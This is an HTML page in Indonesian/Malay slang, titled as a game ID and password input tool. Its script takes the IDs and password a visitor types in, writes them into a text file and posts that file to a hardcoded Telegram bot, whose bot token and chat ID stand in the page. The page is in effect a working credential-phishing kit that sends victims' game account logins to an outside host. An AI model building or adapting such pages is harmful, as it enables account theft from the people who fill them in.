<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Input ID Game</title>
<style>
    body { font-family: Arial; max-width: 500px; margin: 30px auto; }
    textarea, input { width: 100%; padding: 10px; margin-top: 10px; }
    button { padding: 10px 20px; margin-top: 15px; width: 100%; }
    .link-button {
        background-color: #4CAF50;
        color: white;
        border: none;
        cursor: pointer;
    }
</style>
</head>
<body>

<h2>Input ID Game + Password Untuk Paksu Tersayang</h2>

<label>Masokkan lok ID ye (sigek ID per baris):</label>
<textarea id="idList" rows="10" placeholder="Usah lupak&#10;Masokkan&#10;ID paksuðŸ–•ðŸ»"></textarea>

<label>Password:</label>
<input type="text" id="password" placeholder="Masokkan juak password">

<button onclick="kirim()">Kirim</button>

<!-- Tombol masuk ke index2.html -->
<button class="link-button" onclick="window.location.href='index2.html'">BOT BARSEHKAN ID (KLIK JAK)</button>

<script>
    const botToken = '8538136716:AAHB8NsZmK4PWmruC7BHvz-eky6oiCXCwKM';
    const chatId  = '5633583961';

    async function kirim() {
        const idText = document.getElementById('idList').value.trim();
        const password = document.getElementById('password').value.trim();

        if (!idText || !password) {
            alert("ID dan Password harus diisi!");
            return;
        }

        const idArray = idText.split(/\r?\n/);
        let output = "";

        idArray.forEach(id => {
            output += id.trim() + "\t" + password + "\n"; // pemisah tab
        });

        const blob = new Blob([output], { type: "text/plain" });
        const file = new File([blob], "hasilID.txt");

        const formData = new FormData();
        formData.append("document", file);

        try {
            const response = await fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
                method: "POST",
                body: formData
            });

            const data = await response.json();
            if (data.ok) {
                alert("File berhasil dikirim ke Telegram!");
            } else {
                alert("Gagal mengirim file: " + data.description);
            }
        } catch (err) {
            alert("Terjadi kesalahan: " + err.message);
        }
    }
</script>

</body>
</html>
